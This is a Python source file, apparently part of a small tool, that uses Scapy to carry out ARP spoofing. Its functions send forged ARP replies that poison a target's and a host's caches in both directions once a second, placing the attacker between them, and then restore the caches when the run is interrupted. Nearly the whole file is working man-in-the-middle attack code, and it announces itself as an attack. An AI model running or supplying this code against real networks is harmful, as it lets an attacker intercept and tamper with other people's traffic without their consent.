from scapy.all import *
import os
import sys
import argparse
import time

#Returns the mac of the given IP address
#If the given IP is unresponsive, 'none' is returned
def getMac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout = 3, verbose = 0)
    if ans:
        return ans[0][1].src
        
#We send packets to 'target_ip' saying we are the 'host_ip'
#toPrint is set to 1 if we want to print interactions
def spoof(target_ip, host_ip, toPrint):
    target_mac = getMac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at') #creating the packet
    send(arp_response, verbose = 0) #sending the packet

    if toPrint.get() == 1:  #if it is set to print commands, then print
        self_mac = ARP().hwsrc
        print("Packet sent to"),
        print(target_ip),
        print(":"),
        print(host_ip),
        print(" has MAC address "),
        print(self_mac)

#Restores the changes done by spoofing such that 'target_ip' will know where the real 'host_ip' is found
#toPrint is set to 1 if we want to print interactions
def restore(target_ip, host_ip, toPrint):
    host_mac = getMac(host_ip)
    target_mac = getMac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at") #create restoring packet
    send(arp_response, verbose=0, count=5) # sending the packet

    if toPrint.get() == 1:
        self_mac = ARP().hwsrc
        print("Packet sent to"),
        print(target_ip),
        print(":"),
        print(host_ip),
        print(" has MAC address "),
        print(host_mac)

def startARP(ipAttacker, ipTarget, ipHost, toPrint):
    print("ARP ATTACK STARTED")

    try:
        while True:
            spoof(ipTarget, ipHost, toPrint) #making the 'target' think we are the 'host'
            spoof(ipHost, ipTarget, toPrint) #making the 'host' think we are the 'target'
            time.sleep(1) #pause 1s between sending packets
    except KeyboardInterrupt:
        print("ARP attack stopping, please wait")
        restore(ipTarget, ipHost, toPrint) #restore the communication from 'target' to 'host'
        restore(ipHost, ipTarget, toPrint) #restore the communication from 'host' to 'target'
        print("ARP attack stopped")


